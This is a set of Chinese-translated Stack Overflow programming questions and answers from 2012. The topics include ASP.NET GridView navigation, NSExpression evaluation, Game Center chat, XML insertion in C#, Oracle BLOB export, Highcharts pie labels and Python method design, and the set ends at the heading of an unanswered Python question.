> 赞同：-2
> 
> 时间：2012-09-26T14:05:54.187
> 
> 标签：javascript, html, css

我们都知道IE在打开html和渲染css文件方面有很多问题。

我希望 IE 在打开页面时不显示任何内容。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-26T14:08:19.053

您可以使用条件评论并清除您的页面！

```
<!--[if IE]>
<script>
window.onload = function() {
    document.body.innerHTML = 'Please choose a better browser!';
}
</script>
<![endif]--> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T07:22:25.240

你也可以使用这个[jQuery 插件](http://jreject.turnwheel.com/)。

# c# - 如何使用 GridView 实现 IF 语句

> ID：12603579
> 
> 赞同：0
> 
> 时间：2012-09-26T14:06:00.087
> 
> 标签：c#, asp.net, gridview

我正在开发我的第一个 Web 项目，在使用 GridView 时需要帮助添加 IF 逻辑。我有一个页面（CustomerListPage），其中有一个 GridView 项目，该项目显示可以单击的客户（行）列表。单击客户后，用户将被重定向到名为“CustomerUsagePage”的页面，该页面显示该客户的最新记录。这是我的 CustomerListPage 的 GridView 代码的样子：

```
 if (GridView1.SelectedRow.RowIndex == 0)
   {
       //string selectedUser = GridView1.SelectedRow.Cells[0].ToString();
       Response.Redirect("CustomerUsagePage.aspx?Customer_Name=" );
       BindGridview();
   } 
```

我的 CustomerUsagePage 的代码如下所示：

```
private void BindControlvalues()
{

    con.Open();
    SqlCommand cmd = new SqlCommand("select * from dbo.CustomerTable", con);
    SqlDataAdapter da = new SqlDataAdapter(cmd);
    con.Close();
    DataSet ds = new DataSet();
    da.Fill(ds);
    Label4.Text = ds.Tables[0].Rows[0][1].ToString();
    Label1.Text = ds.Tables[0].Rows[0][0].ToString();
    Label2.Text = ds.Tables[0].Rows[0][3].ToString();
    Label3.Text = ds.Tables[0].Rows[0][4].ToString();
} 
```

我的问题是我只能在 GridView 所在的页面添加 IF 逻辑。我想点击一个客户，让他的数据出现在我的 CustomerUsagePage 上，并带有 if 语句。可能吗？我知道我可以通过为每个客户添加一个页面来做到这一点，但我不想走那条路，这似乎很乏味。有没有人有什么建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:11:26.053

您可以使用`GridView-FormView (Master/Detail) Control`

链接： http: [//www.codeproject.com/Articles/16780/GridView-FormView-Master-Detail-Control](http://www.codeproject.com/Articles/16780/GridView-FormView-Master-Detail-Control)。

或者您可以将经典行为与`ItemCommand`事件一起使用

```
void GridView_RowCommand(Object sender, GridViewCommandEventArgs e)
{
    if(e.CommandName=="Add")
    {
      int index = Convert.ToInt32(e.CommandArgument);

      GridViewRow row = CustomersGridView.Rows[index];

      .....//Adjust your Response
    }
} 
```

# objective-c - 在字符串中添加数学符号

> ID：12603581
> 
> 赞同：-6
> 
> 时间：2012-09-26T14:06:09.723
> 
> 标签：objective-c, add, symbols

因为我在变量中分配符号，我怎么能添加`a`和`b`不使用符号？`+``+``c`

我知道如何使用上述数据形成表达式，如下面的代码所示，但我不知道如何使用 NSExpression 获取该表达式的输出。

这是我的代码：

```
int a=10;
int b=20;
NSString *c=@"+";

NSString *d=[NSString stringWithFormat:@"%d%@%d",a,c,b];

nslog(@"d=%@",d);//d=10+20 
```

在此之后，我如何得到答案 30？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-26T14:11:33.893

如果要求 a 和 b 的和，可以：

```
-(-a-b) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-26T14:12:18.270

使用数学，您可以将两个数字相加，而无需像这样使用加法

```
b*=-1
int result = a-b; 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-26T14:10:32.017

使用以下代码添加两个不带“+”号的数字。

```
int add(int x, int y) {
    int carry = 0;
    int result = 0;
    int i;

    for(i = 0; i < 32; ++i) {
        int a = (x >> i) & 1;
        int b = (y >> i) & 1;
        result |= ((a ^ b) ^ carry) << i;
        carry = (a & b) | (b & carry) | (carry & a);
    }

    return result;
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-26T14:11:25.320

您可以编写一个函数，从字符串中提取运算符（在本例中为 +）并据此进行计算。我敦促您至少观看斯坦福大学[的 Paul Hegarty 编程课程的前几集。](http://itunes.apple.com/itunes-u/ipad-iphone-application-development/id473757255?mt=10)你将构建一个计算器，它会做你想知道的事情来解决你的问题。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-26T15:22:17.753

```
int a = 10;
int b = 20;
NSString *c = @"+";

NSString *s = [NSString stringWithFormat:@"%d %@ %d", a, c, b];
NSExpression *e = [NSExpression expressionWithFormat:s];
int result = [[e expressionValueWithObject:nil context:nil] intValue];

NSLog(@"%d", result); 
```

# ios - 使用 Game Center 向其他玩家发送文本聊天消息？

> ID：12603585
> 
> 赞同：1
> 
> 时间：2012-09-26T14:06:28.843
> 
> 标签：ios, game-center, gamekit

是否可以通过 Game Center 向其他玩家发送文字聊天消息？他们有什么专门的方法可以用 GameKit API 做到这一点吗？还是只需要放入玩家之间发送的回合数据中？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:12:25.400

你必须自己写，游戏中心没有允许聊天的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-24T10:09:54.963

就像已经提出的那样，您可以使用`GKTurnBasedMatch`'s `matchData`。如果您的游戏是回合制的，您可以有两种游戏数据消息类型：一种用于在每个玩家回合结束时发送游戏数据，另一种用于发送聊天消息。或者您可以将它们组合起来，以便在每个玩家结束回合时发送一条消息。但是，如果您只用于`matchData`发送聊天消息，请确保它不会结束玩家的回合，否则您将遇到游戏同步问题。`saveCurrentTurnWithMatchData:completionHandler:`用于发送您的消息的使用方法；另一方面，GameKit 会在收到消息时调用您的轮回回调 - 您应该阅读更新的`matchData`并查看它是消息还是游戏状态更新——如果你使用 JSON 或 XML 或 NSDictionary 序列化来来回发送数据，这相对容易——你可以`dataType`在那里引入类似属性的东西，让你区分文本消息和游戏状态更新。

还有一个更改`match.message`内容的选项，但是如果您将短消息放在那里，对手只会在收到来自 GameCenter 的“轮到您”的通知时才能看到它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-27T01:19:17.330

您可以在游戏期间将文本作为普通数据发送。为了做到这一点

准备发送数据的方法

```
-(void)sendText:(NSString *) text {

    NSString * text2Send = [NSString stringWithFormat:@"%@", text];
    [self sendData:[text2Send dataUsingEncoding:NSUTF8StringEncoding]];
} 
```

发送数据方法将是游戏中心的正常数据发送方法，如

```
- (BOOL)sendDataToAllPlayers:(NSData *)data withDataMode:(GKMatchSendDataMode)mode error:(NSError **)error; 
```

并且为了解析接收到的数据

```
NSString * rawText = [[NSString alloc] initWithBytes:[data bytes] length:[data length] encoding:NSUTF8StringEncoding];

if(rawText.length > 0)
{   
    //Do what ever you want with the text
} 
```

# html - 固定标题，DIV 坐在后面不下

> ID：12603586
> 
> 赞同：4
> 
> 时间：2012-09-26T14:06:31.987
> 
> 标签：html, css

如果有人可以提供帮助，我有一个小问题。我可能真的很愚蠢，但我似乎无法让我的 DIV 坐在我的固定标题下，因为它目前坐在后面。

```
</body>
    <div id="container">
        <div id="header">
        </div>
        <div class="home">
            <img src="images/home.jpg" alt="" height="563" width="760">
        </div>
    </div>
</body>

body {
    text-align: center;
}

#container {
    width: 760px;
    margin-left: auto;
    margin-right: auto;
}

#header {
    padding-top: 250px;
    position: fixed;
    background-image: url(images/logo.png);
    background-repeat: no-repeat;
    background-position: 50% 40%;
}

.home {
} 
```

编辑：另一件事是在标题中有一个基本的 CSS 菜单，不认为代码对于这个问题是必要的。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-26T14:08:58.690

定位绝对/固定将 div 从文档流中取出。要`.home`使其位于标题下方，您需要将其`margin-top`设置为与标题的高度相同

# c# - 使用 xmlReader

> ID：12603589
> 
> 赞同：0
> 
> 时间：2012-09-26T14:06:39.787
> 
> 标签：c#, asp.net, xml, xmlreader

我正在尝试读取一个 xml 字符串，然后通过插入另一个 xml 字符串来修改它，我不知道该怎么做，因为我是这个领域的初学者，所以我很挣扎。我在网上搜索，我真的很困惑 xmlWriter 和 xmlReader 因为我不想使用 xmlDocument 我从微软 [http://msdn.microsoft.com/en-us/library/cc189056(v=vs.95) 找到了这个。 aspx](http://msdn.microsoft.com/en-us/library/cc189056(v=vs.95).aspx)

所以我的代码是这样的

```
 String Mainxmltext = "<ClosedKPICalls>" +
    "<ServiceInfo>  <ServiceNo>HR011</ServiceNo> <ServiceName>Petty cash</ServiceName>    "+
    "<RecCount>0</RecCount>  <RegdKPI>2</RegdKPI>  </ServiceInfo> </ClosedKPICalls>";

    String xmlinnerText = "<TaskDetails> <name>Jhone</name> <Description>just for testing</Description> </TaskDetails>";

    StringBuilder output = new StringBuilder();
    using (XmlReader reader = XmlReader.Create(new StringReader(Mainxmltext)))
    {
        XmlWriterSettings ws = new XmlWriterSettings();
        ws.Indent = true;
        using (XmlWriter writer = XmlWriter.Create(output, ws))
        {

            // Parse the file and display each of the nodes.
            while (reader.Read())
            {
                switch (reader.NodeType)
                {

                    case XmlNodeType.Element:
                        writer.WriteStartElement(reader.Name);                           
                        break;
                    case XmlNodeType.Text:
                        writer.WriteString(reader.Value);

                        break;
                    case XmlNodeType.XmlDeclaration:
                    case XmlNodeType.ProcessingInstruction:
                        writer.WriteProcessingInstruction(reader.Name, reader.Value);
                        break;
                    case XmlNodeType.Comment:
                        writer.WriteComment(reader.Value);
                        break;
                    case XmlNodeType.EndElement:
                        writer.WriteFullEndElement();                           
                        break;
                }
            }
        }
    }

    MessageBox.Show(output.ToString());

} 
```

所以我现在成功读取了第一个字符串我如何在我之前的意思的主 xml 的结束标记之前插入第二个测试，我的 xml 应该看起来像这样

```
<ClosedKPICalls>
<ServiceInfo>  
<ServiceNo>HR011</ServiceNo> 
<ServiceName>Petty cash</ServiceName>  
<RecCount>0</RecCount>  
<RegdKPI>2</RegdKPI>  
</ServiceInfo>
<TaskDetails> 
<name>Jhone</name> 
<Description>just for testing</Description> 
</TaskDetails>
</ClosedKPICalls> 
```

请帮忙谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:13:32.027

[Linq2Xml](http://msdn.microsoft.com/en-us/library/system.xml.linq.aspx)更易于使用。

```
String Mainxmltext = "<ClosedKPICalls>" +
        "<ServiceInfo>  <ServiceNo>HR011</ServiceNo> <ServiceName>Petty cash</ServiceName>    " +
        "<RecCount>0</RecCount>  <RegdKPI>2</RegdKPI>  </ServiceInfo> </ClosedKPICalls>";

String xmlinnerText = "<TaskDetails> <name>Jhone</name> <Description>just for testing</Description> </TaskDetails>";

XDocument xDoc = XDocument.Parse(Mainxmltext);
xDoc.Root.Add(XElement.Parse(xmlinnerText));
var newxml = xDoc.ToString(); 
```

这就是获得您想要的xml的全部内容

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:14:02.417

你想要实现的只是将一段 xml 插入一个 xml 字符串，你可以使用`XElement`该类来实现这一点。

例如。

```
var xmlString = "<person></person>";

var xEl = XElement.Parse(xmlString);

xEl.Add(XElement.Parse("<name>vijay</name>"));

Console.Writeline(XEl); 
```

输出/输出

```
<person><name>vijay</name></person> 
```

谷歌为`XElement`.

# javascript - 可以在 Jquery 自动完成中做吗？

> ID：12603590
> 
> 赞同：0
> 
> 时间：2012-09-26T14:06:39.910
> 
> 标签：javascript, jquery, ajax

我正在使用 JQuery 插件为我的项目开发“自动完成”功能，我需要从两个不同的来源（数据库表）向用户显示建议（匹配的结果），这意味着需要为两个 url 发送 ajax 请求时间。

有可能吗？

如果我对此有任何建议，我会很高兴

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:13:54.247

使用 javascript 函数作为自动完成的源。您可以在内部执行两个 ajax 请求并将响应合并为一个。

```
$('#myinput').autocomplete({
   source: function(data, callback) {
      $.ajax(firstUrl, { 
         ..., 
         success: function(result1) {
                $.ajax(secondUrl, {
                     success: function(result2) {
                           var mergedResults = result1.concat(result2);
                           callback(mergedResults);
                     }
                });
         },
   }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:22:57.983

我为[jsdocu.com](http://jsdocu.com)写了一些东西。但这只是搜索的一个来源。但是，根据您的需要更改它并不难。

```
/** delayR by Yannick Albert | https://gist.github.com/3729753 **/
var delayR = function(a,b,c,d){c=null;return function(){d=this;clearTimeout(c);c=setTimeout(function(){a.apply(d,arguments)},b)}};
$("#s").bind('click keyup', delayR(function() {
    var term = this.value,
        url = $('#searchform').attr('action');

    if (term) {
        $.post(url, {
            s: term
        }, function(data) {
            var content = $(data).find('.hentry');
            if (content.length !== 0) {
                $("#autocomplete").fadeIn().empty().append(content);
            } else {
                $("#autocomplete").hide();
            }
        });
    } else {
        $("#autocomplete").fadeOut();
    }
}, 300)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T14:22:26.297

是的，这是可能的，但这是 2 个问题。使用 Microsoft 发明的原始 ajax 对象，您不能同时发出多个请求。有很多脚本可以让这成为可能，但你是一个幸运的人，jQuery 已经拥有一个。另一个问题是关于自动完成功能，可以用 trie 数据结构解决。它在存储大型词典方面非常有效。

# multithreading - GUI锁定uo，在事件中运行线程时，为什么

> ID：12603591
> 
> 赞同：0
> 
> 时间：2012-09-26T14:06:43.113
> 
> 标签：multithreading, c#-4.0

我需要启用我的 gui 上的取消或停止按钮。但是当我运行事件时，我的 gui 会锁定。我明白为什么？

所以我开始一个新线程，运行循环，检查我是否点击了取消。在循环内部，我启动了一个新线程来处理该工作，然后更新 gui。

```
 //this is button click event.

    filesToImport = [list of obj, with information abount som task that needs to be done]
        TaskScheduler taskScheduler = TaskScheduler.FromCurrentSynchronizationContext(); // current gui context 

    // start a new thread
              Task.Factory.StartNew(() => {
                foreach (fics_ds_import job in filesToImport)
                {
    // have the user cancel();

                  if (this.CancellationTokenSource.IsCancellationRequested)
                  {
                    //this.CancellationTokenSource.Token.ThrowIfCancellationRequested();
                    break;
                  }

// start new thread for doing the task, and update the gui.
                  Task.Factory.StartNew(() => this.DoSomeWork(this.ConnectionStringTxt.Text, job), this.CancellationTokenSource.Token, TaskCreationOptions.None, taskScheduler).ContinueWith(o => this.UpdateProcessStatus(), taskScheduler);
                }
              }, this.CancellationTokenSource.Token, TaskCreationOptions.LongRunning, taskScheduler); 
```

# oracle - 来自 Oracle 中 BLOB 的 OS 文件

> ID：12603592
> 
> 赞同：1
> 
> 时间：2012-09-26T14:06:45.263
> 
> 标签：oracle, plsql

我正在考虑是否可以将 Oracle blob 写入操作系统文件。乍一看，只能使用外部程序，但可能会有所改变......

> 如何在 PL/SQL 中将 BLOB 保存到磁盘上的文件 来自：Thomas Kyte
> 
> 使用 DBMS_LOB 从 BLOB 中读取
> 
> 您需要创建一个外部过程来获取二进制数据并将其写入操作系统，外部过程可以用 C 编写。如果是 CLOB 数据，您可以使用 UTL_FILE 将其写入操作系统，但 UTL_FILE 不支持BLOB 中的二进制文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-03-30T20:03:50.217

使用 DB Job 将文件从表迁移到 OS 文件 de SO

基于表 fou_archvos 的示例，它在“archivo”列上有文件，id+nombre 将被连接。

```
SQL> desc fou_archvos
Name      Null?    Type
----------------------------------------- -------- ----------------------------
ID        NOT NULL NUMBER
NOMBRE      NOT NULL VARCHAR2(300)
ACTIVO      NOT NULL CHAR(1)
ARCHIVO        BLOB 
```

在操作系统上创建一个文件夹，它应该具有操作系统 Oracle 用户所有者的权限。

```
su - oracle
mkdir /tmp/fou_archvo 
```

在 DB 上创建一个目录对象，例如 TUKLI_FOU_ARCHVOS，授予程序所在的方案权限，例如 PROD。

```
connect system/***@DB
CREATE OR REPLACE DIRECTORY TUKLI_FOU_ARCHVOS AS '/tmp/fou_archvos';
GRANT READ, WRITE ON DIRECTORY TUKLI_FOU_ARCHVOS TO PROD; 
```

Crear el TU24X7_ARCHVES_TO_OSFILE.prc en PROD 方案，对象

```
CREATE or replace PROCEDURE TU24X7_ARCHVES_TO_OSFILE(p_from_id number default null )
as
    l_file    UTL_FILE.FILE_TYPE;
    l_buffer    RAW(32767);
    l_amount    BINARY_INTEGER := 32767;
    l_pos     INTEGER;
    --l_blob    BLOB;
    l_blob_len  INTEGER;
    l_id    varchar2(10);
BEGIN
    FOR rFile IN (SELECT archivo, to_char(id)||'_'||nombre filename 
                    FROM fou_archvos 
                    where 1=1 
                    and id >= nvl(p_from_id,id)
                ) 
        LOOP
            l_pos := 1;
            l_blob_len := DBMS_LOB.getlength(rFile.archivo);
            l_file := UTL_FILE.fopen('TUKLI_FOU_ARCHVOS',rFile.filename,'wb', 32767);
            WHILE l_pos <= l_blob_len LOOP
            DBMS_LOB.read(rFile.archivo, l_amount, l_pos, l_buffer);
            UTL_FILE.put_raw(l_file, l_buffer, TRUE);
            l_pos := l_pos + l_amount;
        END LOOP;

        -- Close the file.
        UTL_FILE.fclose(l_file);
    END LOOP;
EXCEPTION
    WHEN OTHERS THEN
        -- Close the file if something goes wrong.
        IF UTL_FILE.is_open(l_file) THEN
        UTL_FILE.fclose(l_file);
        END IF;
        RAISE;

END;
/ 
```

使用 JOB DB 连接 PROD/XX@DB 执行

```
declare
    l_jobid number := null;
    begin
    dbms_job.submit 
                (
                    job     =>  l_jobid,
                    what    =>  'TU24X7_ARCHVES_TO_OSFILE;',
                    next_date =>  sysdate,
                    interval  =>  null
                );
    commit;
end;
/ 
```

# highcharts - 处理饼图标签重叠[Highcharts]

> ID：12603593
> 
> 赞同：7
> 
> 时间：2012-09-26T14:06:47.727
> 
> 标签：highcharts

我的图表很丑，我不知道该怎么办。这很难看，因为标签重叠并且几乎不可读。我已经考虑过的想法：

*   隐藏小切片的标签。这具有明显的负面信息，即可见信息较少，尤其是在打印页面时。我们的用户打印了很多。
*   交替大片和小片。不理想，因为它减少了信息的组织，并且可能偶尔会遇到同样的问题。
*   手动放置每个固定位置的标签。关于实施时间和代码维护的昂贵解决方案。

有人有更好的主意吗？我希望 highcharts 能够检测重叠并自动对其进行处理。这是图片：

![这张图表上的标签重叠显然是一个问题](../Images/7672fe1653b134887799641dcd59a02b.png)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-25T00:40:01.310

Highcharts 中有一个新选项可以设置饼图的 startAngle。您可以使用 startAngle 来排列图表右侧的所有小切片，以适应更多标签。

```
series: [{
    startAngle: 90
}] 
```

JSFiddle 演示在这里：http: [//jsfiddle.net/highcharts/dK9CD/](http://jsfiddle.net/highcharts/dK9CD/)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-09-26T14:20:54.397

我发现了一个关于旋转饼图以在这种情况下更好地分配标签的 highcharts[论坛主题，但它涉及修改源以找到以下行并将累积引用更改为零：](http://highslide.com/forum/viewtopic.php?f=9&t=10384)

```
cumulative = -0.25, // start at top 
```

一种不是最佳但可能有效的选项是将数据标签[旋转](http://api.highcharts.com/highcharts#plotOptions.pie.dataLabels.rotation)几度以使它们不重叠，如下所示：

```
{
    plotOptions : {
        pie : {
            dataLabels : {
                rotation : 15
            }
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-10-12T18:06:18.940

我也遇到了同样的问题。我用下面的代码解决了这个问题。

```
plotOptions : {
    pie : {
        dataLabels : {
            whiteSpace: 'nowrap', 
            overflow: 'hidden',
            textOverflow: 'ellipsis'
        }
    }
} 
```

# javascript - Javascript 嵌套对象

> ID：12603594
> 
> 赞同：1
> 
> 时间：2012-09-26T14:06:48.543
> 
> 标签：javascript, oop

我正在尝试用 Javascript 做一些面向对象，而且我来自 C++ 和 Ruby。我已经设法创建了一个对象，但是在里面嵌套一个对象有点痛苦。

```
function Model()
{
   //...
}

function Player(props)
{
   var props = {
      // ...
   }

   var model = new Model(props); // I've tried 'this.model = new Model() as well
}

var props = {
   // ...
}
var player = new Player(props); 
```

播放器创建得很好，但是如果我尝试嵌套对象它会失败。我究竟做错了什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:11:05.273

[例子](http://jsfiddle.net/M2J8y/)

你很亲密。javascript中有更好的“伪扩展”对象方法。[**jQuery.extend**](http://api.jquery.com/jQuery.extend/)是一种可能的方式。您也可以编写自己的方法来检查属性。我认为对你来说最大的问题是`props`在`Player`函数中覆盖。

*   功能`this`是关键
*   函数是 JavaScript 中唯一的作用域，所以要小心命名变量
*   理解对象字面量`var a = {}`和函数之间的区别很重要`var a = new Method();`。但是，您似乎对此做得很好。

# 代码

```
function Model(data)
{
   this.Name = data.Name;
   this.Other = data.Other;
}

function Player(props)
{
   var privateProps = {
       Name: 'testing'
   };
   privateProps.Other = props.Other;
   this.model = new Model(privateProps); // I've tried 'this.model = new Model() as well
}

var props = {
    Other: 'Other'
}
var player = new Player(props); 
```

​</p>

# python - 在 Python 中编写接受单个项目或可迭代项目的方法

> ID：12603597
> 
> 赞同：0
> 
> 时间：2012-09-26T14:07:02.410
> 
> 标签：python

我有一个设计问题。我想编写一个方法接受单个对象或对象的可迭代。例如，假设我有 Dog 类：

```
class Dog(object):
    """
    An animal with four legs that may slobber a lot
    """
    def __init__(self, name="Fido"):
       self.name = name 
```

现在假设我有一个使用 Dog 类的类，比如 DogWalker：

```
class DogWalker(object):
    """
    Someone who cares for Fido when Human Companion is not available
    """
    def __init__(self):
        self.dogs_walked = 0
        self.dogs_watered = 0

    def walk(self, dogs):
        """
        Take a dog for a walk
        """
        # This is not Pythonic
        if isinstance(Dog, dogs):
            # Walk a single dog
            pass
            self.dogs_walked +=1
        else:
            # walk lots of dogs
            pass

    def water(self, dogs):
        """
        Provide water to dogs
        """
        # More pythonic
        try:
            # Try to water single dog
            ...
            self.dogs_walked += 1
        except  AttributeError:
            # Try to water lots of dogs
            pass 
```

在上面的示例中，我实现了两种方法 walk 和 water。water 方法更 Pythonic，因为它使用 Duck Typing。但是，我想进一步讨论。假设我有一个可以给不同类型的动物浇水的看护班：

```
class CareTaker(object):
    """
    Someone who cares for things
    """
    def __init__(self):
        self.things_watered = 0

    def water(self, things):
        """
        Provide water to a thing
        """
        # Here is where I need help!
        # 1\. I need to figure out if things is a single item or iterable
        # 2\. If thing is a single item I need to figure out what type of thing a thing is
        # 3\. If thing is an iterable, I need to figure out what type of things are in the iterable.
        pass 
```

现在，我想到的一件事是，每个事物都可以自己给自己浇水，然后看护人只需调用事物的浇水方法即可。例如：

```
class CareTaker(object):
    """
    Someone who cares for things
    """
    def __init__(self):
        self.things_watered = 0

    def water(self, thing):
        """
        Provide water to a thing
        """
        result = thing.water()
        self.things_watered += 1
        return result 
```

使用代码的方式可能如下所示：

```
ct = CareTaker()
dog = Dog()
bird = Bird()
water_dog = ct.water(dog)
water_bird = ct.water(bird)

things = [dog, bird]

for thing in things:
    ct.water(thing) 
```

我还有一些其他的想法，但在我采用特定的设计方法之前，我想从其他可能遇到过此类问题的人那里获得一些意见。如果您也可以列出您的想法的优缺点。那将是一个奖金！谢谢。

更新：到目前为止，似乎有两个同样好的建议。

1.  测试传入的参数的行为，例如，编写一个 is_itereable 方法。
2.  使用位置参数并遍历位置参数列表中的项目列表。

我还没有确定哪个更适合我的实际问题。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-26T14:10:04.273

您可以使用`*args`“通配符”位置参数：

```
def walk(self, *dogs):
    for dog in dogs:
        # handle each dog. 
```

并将其称为：

```
owner.walk(onedog, anotherdog) 
```

或者

```
owner.walk(*listofdogs) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:44:45.807

我建议你将两者结合起来。如果狗、猫和鸟可以拥有相同的方法，请使用方法名称而不关心您实际拥有哪个对象。（常用方法是你的动物 API）。但是，如果您传递一个容器，这将不起作用，除非您冒着伪造容器类的麻烦，该容器类将每个 API 方法应用于其每个子项。这在技术上是可行的，但我发现以下更有吸引力：编写代码以始终期待一个容器，并通过将单个对象嵌入到列表中来转换它们：

```
class Caretaker(object):
    ...
    def water(self, things):
        if isinstance(things, animal): # actually only one: fix it
            things = [ things ]

        for thing in things:
            ... 
```

这假设您有一个`animal`从中派生的父类`dog`和`bird`. 或者，您可以显式检查是否`things`是可迭代的，如下所示：

```
 if not isinstance(things, collections.Iterable):
            things = [ things ] 
```

但我更喜欢第一种方法。

# python - 为什么我会得到这个“无效的句柄！” Python cx_Oracle 中的错误？

> ID：12603599
> 
> 赞同：2
> 
> 时间：2012-09-26T14:07:09.063
> 
> 标签：python, cx-oracle

这个问题与我在[此处](https://stackoverflow.com/questions/8646968/how-do-i-read-cx-oracle-lob-data-in-python)发布的早期问题之一有关。

我有这个代码：

```
dsn = cx_Oracle.makedsn(hostname, port, sid)
orcl = cx_Oracle.connect(username + '/' + password + '@' + dsn)
curs = orcl.cursor()
sql = "select TEMPLATE from my_table where id ='6'"
curs.execute(sql)
rows = curs.fetchall()
print rows
template = rows[0][0]
orcl.close()
template.read() 
```

当我这样做时`print rows`，我得到了这个：

```
[(<cx_Oracle.LOB object at 0x0000000001D49990>,)] 
```

但是，当我到达时`template.read()`，我收到此错误：

```
cx_Oracle.DatabaseError: Invalid handle! 
```

现在，当我交换`orcl.close()`并`template.read()`喜欢这样的时候：

```
template.read()
orcl.close() 
```

我根本没有收到任何错误。

此外，这仅在数据类型为 LOB 时发生。如果我正在检索的数据是字符串或整数或任何其他非 LOB 数据，则`print rows`打印我的所有数据并且`template.read()`无论它在`orcl.close()`. 我的问题是，为什么会发生这种情况？

# ajax - Chrome 删除 .innerHTML 插入中的表单标签

> ID：12603600
> 
> 赞同：1
> 
> 时间：2012-09-26T14:07:10.790
> 
> 标签：ajax, jquery, asp.net-ajax

我有一些扩展我的 .net 应用程序的 mvc 框架。他们的任务主要是向 .net 应用程序界面提供部分内容。

有趣的是，镀铬去除了非常必要的

这是我从框架中获取和呈现数据的方式

```
$.ajax({
    url: "/mvc/UserProfile/AddressForm?datatype=shipping",
    dataType: "text", // text html script
    method: "get",
    cache: false,
    success: function (data) {

        console.log(data);

        //var userProfileAdd = document.getElementById("userProfileAdd");
        var userProfileAdd = $("#userProfileAdd")[0];
        userProfileAdd.innerHTML = "<div>" + data + "</div>";
    }
}); 
```

Firefox、IE 等确实会检索所有数据。有谁知道为什么 chrome 会这样？

谢谢

编辑

这是发送到由 console.log 打印的数据变量的代码

```
<script src="/scripts/MicrosoftAjax.js" type="text/javascript"></script>
<script src="/scripts/MicrosoftMvcValidation.js" type="text/javascript"></script>

<form OnSubmit="return false;" action="/mvc/UserProfile/AddressFormPost" id="frmUserAddress" method="post"><div class="validation-summary-valid" id="validationSummary"><ul><li style="display:none"></li>
</ul></div>
<input name="__RequestVerificationToken" type="hidden" value="8Vkd039Wc3825G6CTEomJ/aXfrCyjuEY3sV/ty4znHi9yO0Th535p8VNxqvBwhJ12AREQhvTMhRVNEO6Ke3O87jDAjREg3I3dFYp2Y5geutbEOLk6KHmn6hLb4a5CFaZ3uCOm8uYgr/U4au33yaUFw==" />

<div>
    Select country:
    <select id="Countries" name="Countries"><option value="029">Caribbean</option>
        <option value="AE">U.A.E.</option>
        <option value="AF">Afghanistan</option>
        <option value="AL">Albania</option>
        <option value="AM">Armenia</option>
        <option value="AR">Argentina</option>
    </select>
</div>

<div>
    Postal Code
    <input class="formField textBox" id="PostalCode" name="PostalCode" type="text" value="" />
    <span class="field-validation-valid" id="PostalCode_validationMessage"></span>
</div>

<div>
    City
    <input class="formField textBox" id="City" name="City" type="text" value="" />
    <span class="field-validation-valid" id="City_validationMessage"></span>
</div>

<div>
    State
    <input class="formField textBox" id="State" name="State" type="text" value="" />
    <span class="field-validation-valid" id="State_validationMessage"></span>
</div>

<div>
    First name
    <input class="formField textBox" id="FirstName" name="FirstName" type="text" value="" />
    <span class="field-validation-valid" id="FirstName_validationMessage"></span>
</div>

<div>
    Email
    <input class="formField textBox" id="Email" name="Email" type="text" value="" />
    <span class="field-validation-valid" id="Email_validationMessage"></span>
</div>
<div>
    <input type="submit" value="Send!" id="btnAddressForm" class="button" />
</div>

</form><script type="text/javascript">
//<![CDATA[
if (!window.mvcClientValidationMetadata) { window.mvcClientValidationMetadata = []; }
window.mvcClientValidationMetadata.push({"Fields":[{"FieldName":"PostalCode","ReplaceValidationMessageContents":true,"ValidationMessageId":"PostalCode_validationMessage","ValidationRules":[{"ErrorMessage":"Please enter your postal code","ValidationParameters":{},"ValidationType":"required"}]},{"FieldName":"City","ReplaceValidationMessageContents":true,"ValidationMessageId":"City_validationMessage","ValidationRules":[{"ErrorMessage":"Please enter your city","ValidationParameters":{},"ValidationType":"required"}]},{"FieldName":"State","ReplaceValidationMessageContents":true,"ValidationMessageId":"State_validationMessage","ValidationRules":[{"ErrorMessage":"Please enter your state","ValidationParameters":{},"ValidationType":"required"}]},{"FieldName":"FirstName","ReplaceValidationMessageContents":true,"ValidationMessageId":"FirstName_validationMessage","ValidationRules":[{"ErrorMessage":"Please enter your first name","ValidationParameters":{},"ValidationType":"required"}]},{"FieldName":"Email","ReplaceValidationMessageContents":true,"ValidationMessageId":"Email_validationMessage","ValidationRules":[{"ErrorMessage":"Please enter your first name","ValidationParameters":{},"ValidationType":"required"}]}],"FormId":"frmUserAddress","ReplaceValidationSummary":false,"ValidationSummaryId":"validationSummary"});
//]]>
</script> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-17T14:32:06.347

如果周围有表单元素，Chrome 会删除表单元素。只是表单标签消失了，它的所有内容都保留了。

检查以确保作为表单的“userProfileAdd”没有父节点。

# python - Python：执行长脚本而不阻塞主进程

> ID：12603604
> 
> 赞同：2
> 
> 时间：2012-09-26T14:07:27.260
> 
> 标签：python

